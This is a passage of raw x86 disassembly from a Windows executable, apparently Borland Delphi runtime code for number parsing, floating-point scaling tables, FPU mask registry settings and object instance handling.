  402a6a:	74 43                	je     0x402aaf
  402a6c:	84 db                	test   %bl,%bl
  402a6e:	74 20                	je     0x402a90
  402a70:	eb 04                	jmp    0x402a76
  402a72:	84 db                	test   %bl,%bl
  402a74:	74 2d                	je     0x402aa3
  402a76:	80 eb 30             	sub    $0x30,%bl
  402a79:	80 fb 09             	cmp    $0x9,%bl
  402a7c:	77 25                	ja     0x402aa3
  402a7e:	39 f8                	cmp    %edi,%eax
  402a80:	77 21                	ja     0x402aa3
  402a82:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402a85:	01 c0                	add    %eax,%eax
  402a87:	01 d8                	add    %ebx,%eax
  402a89:	8a 1e                	mov    (%esi),%bl
  402a8b:	46                   	inc    %esi
  402a8c:	84 db                	test   %bl,%bl
  402a8e:	75 e6                	jne    0x402a76
  402a90:	fe cd                	dec    %ch
  402a92:	74 09                	je     0x402a9d
  402a94:	85 c0                	test   %eax,%eax
  402a96:	7d 54                	jge    0x402aec
  402a98:	eb 09                	jmp    0x402aa3
  402a9a:	46                   	inc    %esi
  402a9b:	eb 06                	jmp    0x402aa3
  402a9d:	f7 d8                	neg    %eax
  402a9f:	7e 4b                	jle    0x402aec
  402aa1:	78 49                	js     0x402aec
  402aa3:	5b                   	pop    %ebx
  402aa4:	29 de                	sub    %ebx,%esi
  402aa6:	eb 47                	jmp    0x402aef
  402aa8:	fe c5                	inc    %ch
  402aaa:	8a 1e                	mov    (%esi),%bl
  402aac:	46                   	inc    %esi
  402aad:	eb 9c                	jmp    0x402a4b
  402aaf:	bf ff ff ff 0f       	mov    $0xfffffff,%edi
  402ab4:	8a 1e                	mov    (%esi),%bl
  402ab6:	46                   	inc    %esi
  402ab7:	84 db                	test   %bl,%bl
  402ab9:	74 df                	je     0x402a9a
  402abb:	80 fb 61             	cmp    $0x61,%bl
  402abe:	72 03                	jb     0x402ac3
  402ac0:	80 eb 20             	sub    $0x20,%bl
  402ac3:	80 eb 30             	sub    $0x30,%bl
  402ac6:	80 fb 09             	cmp    $0x9,%bl
  402ac9:	76 0b                	jbe    0x402ad6
  402acb:	80 eb 11             	sub    $0x11,%bl
  402ace:	80 fb 05             	cmp    $0x5,%bl
  402ad1:	77 d0                	ja     0x402aa3
  402ad3:	80 c3 0a             	add    $0xa,%bl
  402ad6:	39 f8                	cmp    %edi,%eax
  402ad8:	77 c9                	ja     0x402aa3
  402ada:	c1 e0 04             	shl    $0x4,%eax
  402add:	01 d8                	add    %ebx,%eax
  402adf:	8a 1e                	mov    (%esi),%bl
  402ae1:	46                   	inc    %esi
  402ae2:	84 db                	test   %bl,%bl
  402ae4:	75 d5                	jne    0x402abb
  402ae6:	fe cd                	dec    %ch
  402ae8:	75 02                	jne    0x402aec
  402aea:	f7 d8                	neg    %eax
  402aec:	59                   	pop    %ecx
  402aed:	31 f6                	xor    %esi,%esi
  402aef:	89 32                	mov    %esi,(%edx)
  402af1:	5f                   	pop    %edi
  402af2:	5e                   	pop    %esi
  402af3:	5b                   	pop    %ebx
  402af4:	c3                   	ret
  402af5:	8d 40 00             	lea    0x0(%eax),%eax
  402af8:	56                   	push   %esi
  402af9:	57                   	push   %edi
  402afa:	89 c6                	mov    %eax,%esi
  402afc:	89 d7                	mov    %edx,%edi
  402afe:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402b04:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  402b06:	5f                   	pop    %edi
  402b07:	5e                   	pop    %esi
  402b08:	c3                   	ret
  402b09:	8d 40 00             	lea    0x0(%eax),%eax
  402b0c:	e9 03 00 00 00       	jmp    0x402b14
  402b11:	c3                   	ret
  402b12:	8b c0                	mov    %eax,%eax
  402b14:	53                   	push   %ebx
  402b15:	31 db                	xor    %ebx,%ebx
  402b17:	85 c0                	test   %eax,%eax
  402b19:	7c 4d                	jl     0x402b68
  402b1b:	0f 84 9a 00 00 00    	je     0x402bbb
  402b21:	3d 00 14 00 00       	cmp    $0x1400,%eax
  402b26:	0f 8d 81 00 00 00    	jge    0x402bad
  402b2c:	89 c2                	mov    %eax,%edx
  402b2e:	83 e2 1f             	and    $0x1f,%edx
  402b31:	8d 14 92             	lea    (%edx,%edx,4),%edx
  402b34:	db ac 53 c7 2b 40 00 	fldt   0x402bc7(%ebx,%edx,2)
  402b3b:	de c9                	fmulp  %st,%st(1)
  402b3d:	c1 e8 05             	shr    $0x5,%eax
  402b40:	74 79                	je     0x402bbb
  402b42:	89 c2                	mov    %eax,%edx
  402b44:	83 e2 0f             	and    $0xf,%edx
  402b47:	74 0c                	je     0x402b55
  402b49:	8d 14 92             	lea    (%edx,%edx,4),%edx
  402b4c:	db ac 53 fd 2c 40 00 	fldt   0x402cfd(%ebx,%edx,2)
  402b53:	de c9                	fmulp  %st,%st(1)
  402b55:	c1 e8 04             	shr    $0x4,%eax
  402b58:	74 61                	je     0x402bbb
  402b5a:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402b5d:	db ac 43 93 2d 40 00 	fldt   0x402d93(%ebx,%eax,2)
  402b64:	de c9                	fmulp  %st,%st(1)
  402b66:	eb 53                	jmp    0x402bbb
  402b68:	f7 d8                	neg    %eax
  402b6a:	3d 00 14 00 00       	cmp    $0x1400,%eax
  402b6f:	7d 46                	jge    0x402bb7
  402b71:	89 c2                	mov    %eax,%edx
  402b73:	83 e2 1f             	and    $0x1f,%edx
  402b76:	8d 14 92             	lea    (%edx,%edx,4),%edx
  402b79:	db ac 53 c7 2b 40 00 	fldt   0x402bc7(%ebx,%edx,2)
  402b80:	de f9                	fdivrp %st,%st(1)
  402b82:	c1 e8 05             	shr    $0x5,%eax
  402b85:	74 34                	je     0x402bbb
  402b87:	89 c2                	mov    %eax,%edx
  402b89:	83 e2 0f             	and    $0xf,%edx
  402b8c:	74 0c                	je     0x402b9a
  402b8e:	8d 14 92             	lea    (%edx,%edx,4),%edx
  402b91:	db ac 53 fd 2c 40 00 	fldt   0x402cfd(%ebx,%edx,2)
  402b98:	de f9                	fdivrp %st,%st(1)
  402b9a:	c1 e8 04             	shr    $0x4,%eax
  402b9d:	74 1c                	je     0x402bbb
  402b9f:	8d 04 80             	lea    (%eax,%eax,4),%eax
  402ba2:	db ac 43 93 2d 40 00 	fldt   0x402d93(%ebx,%eax,2)
  402ba9:	de f9                	fdivrp %st,%st(1)
  402bab:	eb 0e                	jmp    0x402bbb
  402bad:	dd d8                	fstp   %st(0)
  402baf:	db ab bd 2b 40 00    	fldt   0x402bbd(%ebx)
  402bb5:	eb 04                	jmp    0x402bbb
  402bb7:	dd d8                	fstp   %st(0)
  402bb9:	d9 ee                	fldz
  402bbb:	5b                   	pop    %ebx
  402bbc:	c3                   	ret
  402bbd:	00 00                	add    %al,(%eax)
  402bbf:	00 00                	add    %al,(%eax)
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 80 ff 7f 00 00    	add    %al,0x7fff(%eax)
  402bc9:	00 00                	add    %al,(%eax)
  402bcb:	00 00                	add    %al,(%eax)
  402bcd:	00 80 ff 3f 00 00    	add    %al,0x3fff(%eax)
  402bd3:	00 00                	add    %al,(%eax)
  402bd5:	00 00                	add    %al,(%eax)
  402bd7:	00 a0 02 40 00 00    	add    %ah,0x4002(%eax)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 00                	add    %al,(%eax)
  402be1:	00 c8                	add    %cl,%al
  402be3:	05 40 00 00 00       	add    $0x40,%eax
  402be8:	00 00                	add    %al,(%eax)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	fa                   	cli
  402bed:	08 40 00             	or     %al,0x0(%eax)
  402bf0:	00 00                	add    %al,(%eax)
  402bf2:	00 00                	add    %al,(%eax)
  402bf4:	00 40 9c             	add    %al,-0x64(%eax)
  402bf7:	0c 40                	or     $0x40,%al
  402bf9:	00 00                	add    %al,(%eax)
  402bfb:	00 00                	add    %al,(%eax)
  402bfd:	00 00                	add    %al,(%eax)
  402bff:	50                   	push   %eax
  402c00:	c3                   	ret
  402c01:	0f 40 00             	cmovo  (%eax),%eax
  402c04:	00 00                	add    %al,(%eax)
  402c06:	00 00                	add    %al,(%eax)
  402c08:	00 24 f4             	add    %ah,(%esp,%esi,8)
  402c0b:	12 40 00             	adc    0x0(%eax),%al
  402c0e:	00 00                	add    %al,(%eax)
  402c10:	00 00                	add    %al,(%eax)
  402c12:	80 96 98 16 40 00 00 	adcb   $0x0,0x401698(%esi)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	00 20                	add    %ah,(%eax)
  402c1d:	bc be 19 40 00       	mov    $0x4019be,%esp
  402c22:	00 00                	add    %al,(%eax)
  402c24:	00 00                	add    %al,(%eax)
  402c26:	28 6b ee             	sub    %ch,-0x12(%ebx)
  402c29:	1c 40                	sbb    $0x40,%al
  402c2b:	00 00                	add    %al,(%eax)
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	00 f9                	add    %bh,%cl
  402c31:	02 95 20 40 00 00    	add    0x4020(%ebp),%dl
  402c37:	00 00                	add    %al,(%eax)
  402c39:	40                   	inc    %eax
  402c3a:	b7 43                	mov    $0x43,%bh
  402c3c:	ba 23 40 00 00       	mov    $0x4023,%edx
  402c41:	00 00                	add    %al,(%eax)
  402c43:	10 a5 d4 e8 26 40    	adc    %ah,0x4026e8d4(%ebp)
  402c49:	00 00                	add    %al,(%eax)
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	2a e7                	sub    %bh,%ah
  402c4f:	84 91 2a 40 00 00    	test   %dl,0x402a(%ecx)
  402c55:	00 80 f4 20 e6 b5    	add    %al,-0x4a19df0c(%eax)
  402c5b:	2d 40 00 00 00       	sub    $0x40,%eax
  402c60:	a0 31 a9 5f e3       	mov    0xe35fa931,%al
  402c65:	30 40 00             	xor    %al,0x0(%eax)
  402c68:	00 00                	add    %al,(%eax)
  402c6a:	04 bf                	add    $0xbf,%al
  402c6c:	c9                   	leave
  402c6d:	1b 8e 34 40 00 00    	sbb    0x4034(%esi),%ecx
  402c73:	00 c5                	add    %al,%ch
  402c75:	2e bc a2 b1 37 40    	cs mov $0x4037b1a2,%esp
  402c7b:	00 00                	add    %al,(%eax)
  402c7d:	40                   	inc    %eax
  402c7e:	76 3a                	jbe    0x402cba
  402c80:	6b 0b de             	imul   $0xffffffde,(%ebx),%ecx
  402c83:	3a 40 00             	cmp    0x0(%eax),%al
  402c86:	00 e8                	add    %ch,%al
  402c88:	89 04 23             	mov    %eax,(%ebx,%eiz,1)
  402c8b:	c7                   	(bad)
  402c8c:	8a 3e                	mov    (%esi),%bh
  402c8e:	40                   	inc    %eax
  402c8f:	00 00                	add    %al,(%eax)
  402c91:	62 ac c5 eb 78 ad 41 	bound  %ebp,0x41ad78eb(%ebp,%eax,8)
  402c98:	40                   	inc    %eax
  402c99:	00 80 7a 17 b7 26    	add    %al,0x26b7177a(%eax)
  402c9f:	d7                   	xlat   %ds:(%ebx)
  402ca0:	d8 44 40 00          	fadds  0x0(%eax,%eax,2)
  402ca4:	90                   	nop
  402ca5:	ac                   	lods   %ds:(%esi),%al
  402ca6:	6e                   	outsb  %ds:(%esi),(%dx)
  402ca7:	32 78 86             	xor    -0x7a(%eax),%bh
  402caa:	87 48 40             	xchg   %ecx,0x40(%eax)
  402cad:	00 b4 57 0a 3f 16 68 	add    %dh,0x68163f0a(%edi,%edx,2)
  402cb4:	a9 4b 40 00 a1       	test   $0xa100404b,%eax
  402cb9:	ed                   	in     (%dx),%eax
  402cba:	cc                   	int3
  402cbb:	ce                   	into
  402cbc:	1b c2                	sbb    %edx,%eax
  402cbe:	d3 4e 40             	rorl   %cl,0x40(%esi)
  402cc1:	a0 84 14 40 61       	mov    0x61401484,%al
  402cc6:	51                   	push   %ecx
  402cc7:	59                   	pop    %ecx
  402cc8:	84 52 40             	test   %dl,0x40(%edx)
  402ccb:	c8 a5 19 90          	enter  $0x19a5,$0x90
  402ccf:	b9 a5 6f a5 55       	mov    $0x55a56fa5,%ecx
  402cd4:	40                   	inc    %eax
  402cd5:	3a 0f                	cmp    (%edi),%cl
  402cd7:	20 f4                	and    %dh,%ah
  402cd9:	27                   	daa
  402cda:	8f                   	(bad)
  402cdb:	cb                   	lret
  402cdc:	ce                   	into
  402cdd:	58                   	pop    %eax
  402cde:	40                   	inc    %eax
  402cdf:	84 09                	test   %cl,(%ecx)
  402ce1:	94                   	xchg   %eax,%esp
  402ce2:	f8                   	clc
  402ce3:	78 39                	js     0x402d1e
  402ce5:	3f                   	aas
  402ce6:	81 5c 40 e5 0b b9 36 	sbbl   $0xd736b90b,-0x1b(%eax,%eax,2)
  402ced:	d7 
  402cee:	07                   	pop    %es
  402cef:	8f                   	(bad)
  402cf0:	a1 5f 40 df 4e       	mov    0x4edf405f,%eax
  402cf5:	67 04 cd             	addr16 add $0xcd,%al
  402cf8:	c9                   	leave
  402cf9:	f2 c9                	repnz leave
  402cfb:	62 40 96             	bound  %eax,-0x6a(%eax)
  402cfe:	22 81 45 40 7c 6f    	and    0x6f7c4045(%ecx),%al
  402d04:	fc                   	cld
  402d05:	65 40                	gs inc %eax
  402d07:	9e                   	sahf
  402d08:	b5 70                	mov    $0x70,%ch
  402d0a:	2b a8 ad c5 9d 69    	sub    0x699dc5ad(%eax),%ebp
  402d10:	40                   	inc    %eax
  402d11:	d5 a6                	aad    $0xa6
  402d13:	cf                   	iret
  402d14:	ff 49 1f             	decl   0x1f(%ecx)
  402d17:	78 c2                	js     0x402cdb
  402d19:	d3 40 a3             	roll   %cl,-0x5d(%eax)
  402d1c:	14 9b                	adc    $0x9b,%al
  402d1e:	c5 16                	lds    (%esi),%edx
  402d20:	ab                   	stos   %eax,%es:(%edi)
  402d21:	b3 ef                	mov    $0xef,%bl
  402d23:	3d 41 e0 8c e9       	cmp    $0xe98ce041,%eax
  402d28:	80 c9 47             	or     $0x47,%cl
  402d2b:	ba 93 a8 41 aa       	mov    $0xaa41a893,%edx
  402d30:	17                   	pop    %ss
  402d31:	e6 7f                	out    %al,$0x7f
  402d33:	2b a1 16 b6 12 42    	sub    0x4212b616(%ecx),%esp
  402d39:	6b 55 27 39          	imul   $0x39,0x27(%ebp),%edx
  402d3d:	8d                   	lea    (bad),%esi
  402d3e:	f7 70 e0             	divl   -0x20(%eax)
  402d41:	7c 42                	jl     0x402d85
  402d43:	30 c9                	xor    %cl,%cl
  402d45:	3c e3                	cmp    $0xe3,%al
  402d47:	ff 96 52 8a e7 42    	call   *0x42e78a52(%esi)
  402d4d:	8e de                	mov    %esi,%ds
  402d4f:	f9                   	stc
  402d50:	9d                   	popf
  402d51:	fb                   	sti
  402d52:	eb 7e                	jmp    0x402dd2
  402d54:	aa                   	stos   %al,%es:(%edi)
  402d55:	51                   	push   %ecx
  402d56:	43                   	inc    %ebx
  402d57:	8c 2f                	mov    %gs,(%edi)
  402d59:	6a 5c                	push   $0x5c
  402d5b:	19 fc                	sbb    %edi,%esp
  402d5d:	26 d2 bb 43 76 e3 cc 	sarb   %cl,%es:-0x331c89bd(%ebx)
  402d64:	f2 29 2f             	repnz sub %ebp,(%edi)
  402d67:	84 81 26 44 d2 0a    	test   %al,0xad24426(%ecx)
  402d6d:	90                   	nop
  402d6e:	db 00                	fildl  (%eax)
  402d70:	27                   	daa
  402d71:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402d72:	9f                   	lahf
  402d73:	90                   	nop
  402d74:	44                   	inc    %esp
  402d75:	17                   	pop    %ss
  402d76:	aa                   	stos   %al,%es:(%edi)
  402d77:	f8                   	clc
  402d78:	ae                   	scas   %es:(%edi),%al
  402d79:	10 e3                	adc    %ah,%bl
  402d7b:	c5 c4 fa             	(bad)
  402d7e:	44                   	inc    %esp
  402d7f:	59                   	pop    %ecx
  402d80:	9c                   	pushf
  402d81:	b0 e9                	mov    $0xe9,%al
  402d83:	07                   	pop    %es
  402d84:	9c                   	pushf
  402d85:	8a f2                	mov    %dl,%dh
  402d87:	64 45                	fs inc %ebp
  402d89:	d4 f3                	aam    $0xf3
  402d8b:	f7 eb                	imul   %ebx
  402d8d:	e1 4a                	loope  0x402dd9
  402d8f:	7a 95                	jp     0x402d26
  402d91:	cf                   	iret
  402d92:	45                   	inc    %ebp
  402d93:	62 a2 95 07 dc d8    	bound  %esp,-0x2723f86b(%edx)
  402d99:	3e b8 39 46 c7 91    	ds mov $0x91c74639,%eax
  402d9f:	0e                   	push   %cs
  402da0:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402da1:	ae                   	scas   %es:(%edi),%al
  402da2:	a0 19 e3 a3 46       	mov    0x46a3e319,%al
  402da7:	17                   	pop    %ss
  402da8:	0c 75                	or     $0x75,%al
  402daa:	81 86 75 76 c9 48 4d 	addl   $0x93a7e44d,0x48c97675(%esi)
  402db1:	e4 a7 93 
  402db4:	39 3b                	cmp    %edi,(%ebx)
  402db6:	35 b8 b2 ed 53       	xor    $0x53edb2b8,%eax
  402dbb:	e5 5d                	in     $0x5d,%eax
  402dbd:	3d c5 5d 3b 8b       	cmp    $0x8b3b5dc5,%eax
  402dc2:	9e                   	sahf
  402dc3:	92                   	xchg   %eax,%edx
  402dc4:	5a                   	pop    %edx
  402dc5:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402dc6:	f0 a1 20 c0 54 a5    	lock mov 0xa554c020,%eax
  402dcc:	8c 37                	mov    %?,(%edi)
  402dce:	61                   	popa
  402dcf:	8b 5a 8b             	mov    -0x75(%edx),%ebx
  402dd2:	d8 25 5d 89 f9 db    	fsubs  0xdbf9895d
  402dd8:	67 f8                	addr16 clc
  402dda:	f3 27                	repz daa
  402ddc:	bf a2 c8 5d dd       	mov    $0xdd5dc8a2,%edi
  402de1:	80 6e 9b 97          	subb   $0x97,-0x65(%esi)
  402de5:	20 8a 02 52 60 c4    	and    %cl,-0x3b9fadfe(%edx)
  402deb:	25 75 f0 59 d5       	and    $0xd559f075,%eax
  402df0:	6e                   	outsb  %ds:(%esi),(%dx)
  402df1:	62 11                	bound  %edx,(%ecx)
  402df3:	35 ae ca 7b c3       	xor    $0xc37bcaae,%eax
  402df8:	ff 25 a4 41 43 00    	jmp    *0x4341a4
  402dfe:	8b c0                	mov    %eax,%eax
  402e00:	53                   	push   %ebx
  402e01:	33 db                	xor    %ebx,%ebx
  402e03:	6a 00                	push   $0x0
  402e05:	e8 ee ff ff ff       	call   0x402df8
  402e0a:	83 f8 07             	cmp    $0x7,%eax
  402e0d:	75 1c                	jne    0x402e2b
  402e0f:	6a 01                	push   $0x1
  402e11:	e8 e2 ff ff ff       	call   0x402df8
  402e16:	25 00 ff 00 00       	and    $0xff00,%eax
  402e1b:	3d 00 0d 00 00       	cmp    $0xd00,%eax
  402e20:	74 07                	je     0x402e29
  402e22:	3d 00 04 00 00       	cmp    $0x400,%eax
  402e27:	75 02                	jne    0x402e2b
  402e29:	b3 01                	mov    $0x1,%bl
  402e2b:	8b c3                	mov    %ebx,%eax
  402e2d:	5b                   	pop    %ebx
  402e2e:	c3                   	ret
  402e2f:	90                   	nop
  402e30:	55                   	push   %ebp
  402e31:	8b ec                	mov    %esp,%ebp
  402e33:	83 c4 f4             	add    $0xfffffff4,%esp
  402e36:	0f b7 05 20 40 41 00 	movzwl 0x414020,%eax
  402e3d:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402e40:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402e43:	50                   	push   %eax
  402e44:	6a 01                	push   $0x1
  402e46:	6a 00                	push   $0x0
  402e48:	68 c8 2e 40 00       	push   $0x402ec8
  402e4d:	68 02 00 00 80       	push   $0x80000002
  402e52:	e8 c9 e3 ff ff       	call   0x401220
  402e57:	85 c0                	test   %eax,%eax
  402e59:	75 4d                	jne    0x402ea8
  402e5b:	33 c0                	xor    %eax,%eax
  402e5d:	55                   	push   %ebp
  402e5e:	68 a1 2e 40 00       	push   $0x402ea1
  402e63:	64 ff 30             	push   %fs:(%eax)
  402e66:	64 89 20             	mov    %esp,%fs:(%eax)
  402e69:	c7 45 f4 04 00 00 00 	movl   $0x4,-0xc(%ebp)
  402e70:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402e73:	50                   	push   %eax
  402e74:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402e77:	50                   	push   %eax
  402e78:	6a 00                	push   $0x0
  402e7a:	6a 00                	push   $0x0
  402e7c:	68 e4 2e 40 00       	push   $0x402ee4
  402e81:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e84:	50                   	push   %eax
  402e85:	e8 9e e3 ff ff       	call   0x401228
  402e8a:	33 c0                	xor    %eax,%eax
  402e8c:	5a                   	pop    %edx
  402e8d:	59                   	pop    %ecx
  402e8e:	59                   	pop    %ecx
  402e8f:	64 89 10             	mov    %edx,%fs:(%eax)
  402e92:	68 a8 2e 40 00       	push   $0x402ea8
  402e97:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402e9a:	50                   	push   %eax
  402e9b:	e8 78 e3 ff ff       	call   0x401218
  402ea0:	c3                   	ret
  402ea1:	e9 c6 05 00 00       	jmp    0x40346c
  402ea6:	eb ef                	jmp    0x402e97
  402ea8:	66 a1 20 40 41 00    	mov    0x414020,%ax
  402eae:	66 25 c0 ff          	and    $0xffc0,%ax
  402eb2:	66 8b 55 f8          	mov    -0x8(%ebp),%dx
  402eb6:	66 83 e2 3f          	and    $0x3f,%dx
  402eba:	66 0b c2             	or     %dx,%ax
  402ebd:	66 a3 20 40 41 00    	mov    %ax,0x414020
  402ec3:	8b e5                	mov    %ebp,%esp
  402ec5:	5d                   	pop    %ebp
  402ec6:	c3                   	ret
  402ec7:	00 53 4f             	add    %dl,0x4f(%ebx)
  402eca:	46                   	inc    %esi
  402ecb:	54                   	push   %esp
  402ecc:	57                   	push   %edi
  402ecd:	41                   	inc    %ecx
  402ece:	52                   	push   %edx
  402ecf:	45                   	inc    %ebp
  402ed0:	5c                   	pop    %esp
  402ed1:	42                   	inc    %edx
  402ed2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ed3:	72 6c                	jb     0x402f41
  402ed5:	61                   	popa
  402ed6:	6e                   	outsb  %ds:(%esi),(%dx)
  402ed7:	64 5c                	fs pop %esp
  402ed9:	44                   	inc    %esp
  402eda:	65 6c                	gs insb (%dx),%es:(%edi)
  402edc:	70 68                	jo     0x402f46
  402ede:	69 5c 52 54 4c 00 46 	imul   $0x5046004c,0x54(%edx,%edx,2),%ebx
  402ee5:	50 
  402ee6:	55                   	push   %ebp
  402ee7:	4d                   	dec    %ebp
  402ee8:	61                   	popa
  402ee9:	73 6b                	jae    0x402f56
  402eeb:	56                   	push   %esi
  402eec:	61                   	popa
  402eed:	6c                   	insb   (%dx),%es:(%edi)
  402eee:	75 65                	jne    0x402f55
  402ef0:	00 00                	add    %al,(%eax)
  402ef2:	00 00                	add    %al,(%eax)
  402ef4:	db e3                	fninit
  402ef6:	9b d9 2d 20 40 41 00 	fldcw  0x414020
  402efd:	c3                   	ret
  402efe:	8b c0                	mov    %eax,%eax
  402f00:	8b 00                	mov    (%eax),%eax
  402f02:	89 c2                	mov    %eax,%edx
  402f04:	8b c2                	mov    %edx,%eax
  402f06:	c3                   	ret
  402f07:	90                   	nop
  402f08:	56                   	push   %esi
  402f09:	57                   	push   %edi
  402f0a:	89 d7                	mov    %edx,%edi
  402f0c:	8b 70 d4             	mov    -0x2c(%eax),%esi
  402f0f:	31 c9                	xor    %ecx,%ecx
  402f11:	8a 0e                	mov    (%esi),%cl
  402f13:	41                   	inc    %ecx
  402f14:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  402f16:	5f                   	pop    %edi
  402f17:	5e                   	pop    %esi
  402f18:	c3                   	ret
  402f19:	8d 40 00             	lea    0x0(%eax),%eax
  402f1c:	8b 40 dc             	mov    -0x24(%eax),%eax
  402f1f:	85 c0                	test   %eax,%eax
  402f21:	74 02                	je     0x402f25
  402f23:	8b 00                	mov    (%eax),%eax
  402f25:	c3                   	ret
  402f26:	8b c0                	mov    %eax,%eax
  402f28:	53                   	push   %ebx
  402f29:	8b d8                	mov    %eax,%ebx
  402f2b:	8b c3                	mov    %ebx,%eax
  402f2d:	e8 26 00 00 00       	call   0x402f58
  402f32:	e8 f1 f6 ff ff       	call   0x402628
  402f37:	8b d0                	mov    %eax,%edx
  402f39:	8b c3                	mov    %ebx,%eax
  402f3b:	e8 5c 00 00 00       	call   0x402f9c
  402f40:	5b                   	pop    %ebx
  402f41:	c3                   	ret
  402f42:	8b c0                	mov    %eax,%eax
  402f44:	53                   	push   %ebx
  402f45:	8b d8                	mov    %eax,%ebx
  402f47:	8b c3                	mov    %ebx,%eax
  402f49:	e8 a6 00 00 00       	call   0x402ff4
  402f4e:	8b c3                	mov    %ebx,%eax
  402f50:	e8 f3 f6 ff ff       	call   0x402648
  402f55:	5b                   	pop    %ebx
  402f56:	c3                   	ret
  402f57:	90                   	nop
  402f58:	83 c0 d8             	add    $0xffffffd8,%eax
  402f5b:	8b 00                	mov    (%eax),%eax
  402f5d:	c3                   	ret
  402f5e:	8b c0                	mov    %eax,%eax
  402f60:	84 d2                	test   %dl,%dl
  402f62:	74 08                	je     0x402f6c
  402f64:	83 c4 f0             	add    $0xfffffff0,%esp
  402f67:	e8 6c 02 00 00       	call   0x4031d8
  402f6c:	84 d2                	test   %dl,%dl
  402f6e:	74 0f                	je     0x402f7f
  402f70:	e8 bb 02 00 00       	call   0x403230
  402f75:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  402f7c:	83 c4 0c             	add    $0xc,%esp
  402f7f:	c3                   	ret
  402f80:	e8 bb 02 00 00       	call   0x403240
  402f85:	84 d2                	test   %dl,%dl
  402f87:	7e 05                	jle    0x402f8e
  402f89:	e8 9a 02 00 00       	call   0x403228
  402f8e:	c3                   	ret
  402f8f:	90                   	nop
  402f90:	85 c0                	test   %eax,%eax
  402f92:	74 07                	je     0x402f9b
  402f94:	b2 01                	mov    $0x1,%dl
  402f96:	8b 08                	mov    (%eax),%ecx
  402f98:	ff 51 fc             	call   *-0x4(%ecx)
  402f9b:	c3                   	ret
  402f9c:	53                   	push   %ebx
  402f9d:	56                   	push   %esi
  402f9e:	57                   	push   %edi
  402f9f:	89 c3                	mov    %eax,%ebx
  402fa1:	89 d7                	mov    %edx,%edi
  402fa3:	ab                   	stos   %eax,%es:(%edi)
  402fa4:	8b 4b d8             	mov    -0x28(%ebx),%ecx
  402fa7:	31 c0                	xor    %eax,%eax
  402fa9:	51                   	push   %ecx
  402faa:	c1 e9 02             	shr    $0x2,%ecx
  402fad:	49                   	dec    %ecx
  402fae:	f3 ab                	rep stos %eax,%es:(%edi)
  402fb0:	59                   	pop    %ecx
  402fb1:	83 e1 03             	and    $0x3,%ecx
  402fb4:	f3 aa                	rep stos %al,%es:(%edi)
  402fb6:	89 d0                	mov    %edx,%eax
  402fb8:	89 e2                	mov    %esp,%edx
  402fba:	8b 4b b8             	mov    -0x48(%ebx),%ecx
  402fbd:	85 c9                	test   %ecx,%ecx
  402fbf:	74 01                	je     0x402fc2
  402fc1:	51                   	push   %ecx
  402fc2:	8b 5b dc             	mov    -0x24(%ebx),%ebx
  402fc5:	85 db                	test   %ebx,%ebx
  402fc7:	74 04                	je     0x402fcd
  402fc9:	8b 1b                	mov    (%ebx),%ebx
  402fcb:	eb ed                	jmp    0x402fba
  402fcd:	39 d4                	cmp    %edx,%esp
  402fcf:	74 1d                	je     0x402fee
  402fd1:	5b                   	pop    %ebx
  402fd2:	8b 0b                	mov    (%ebx),%ecx
  402fd4:	83 c3 04             	add    $0x4,%ebx
  402fd7:	8b 73 10             	mov    0x10(%ebx),%esi
  402fda:	85 f6                	test   %esi,%esi
  402fdc:	74 06                	je     0x402fe4
  402fde:	8b 7b 14             	mov    0x14(%ebx),%edi
  402fe1:	89 34 07             	mov    %esi,(%edi,%eax,1)
  402fe4:	83 c3 1c             	add    $0x1c,%ebx
  402fe7:	49                   	dec    %ecx
  402fe8:	75 ed                	jne    0x402fd7
  402fea:	39 d4                	cmp    %edx,%esp
  402fec:	75 e3                	jne    0x402fd1
  402fee:	5f                   	pop    %edi
  402fef:	5e                   	pop    %esi
  402ff0:	5b                   	pop    %ebx
  402ff1:	c3                   	ret
  402ff2:	8b c0                	mov    %eax,%eax
  402ff4:	53                   	push   %ebx
  402ff5:	56                   	push   %esi
  402ff6:	89 c3                	mov    %eax,%ebx
  402ff8:	89 c6                	mov    %eax,%esi
  402ffa:	8b 36                	mov    (%esi),%esi
  402ffc:	8b 56 c0             	mov    -0x40(%esi),%edx
  402fff:	8b 76 dc             	mov    -0x24(%esi),%esi
  403002:	85 d2                	test   %edx,%edx
  403004:	74 07                	je     0x40300d
  403006:	e8 25 13 00 00       	call   0x404330
  40300b:	89 d8                	mov    %ebx,%eax
  40300d:	85 f6                	test   %esi,%esi
  40300f:	75 e9                	jne    0x402ffa
  403011:	5e                   	pop    %esi
  403012:	5b                   	pop    %ebx
  403013:	c3                   	ret
  403014:	87 d1                	xchg   %edx,%ecx
  403016:	81 f9 00 00 00 ff    	cmp    $0xff000000,%ecx
  40301c:	73 11                	jae    0x40302f
  40301e:	81 f9 00 00 00 fe    	cmp    $0xfe000000,%ecx
  403024:	72 07                	jb     0x40302d
  403026:	0f bf c9             	movswl %cx,%ecx
  403029:	03 08                	add    (%eax),%ecx
  40302b:	ff 21                	jmp    *(%ecx)
  40302d:	ff e1                	jmp    *%ecx
  40302f:	81 e1 ff ff ff 00    	and    $0xffffff,%ecx
  403035:	01 c1                	add    %eax,%ecx
  403037:	89 d0                	mov    %edx,%eax
  403039:	8b 11                	mov    (%ecx),%edx
  40303b:	e9 0c 1f 00 00       	jmp    0x404f4c
  403040:	c3                   	ret
  403041:	8d 40 00             	lea    0x0(%eax),%eax
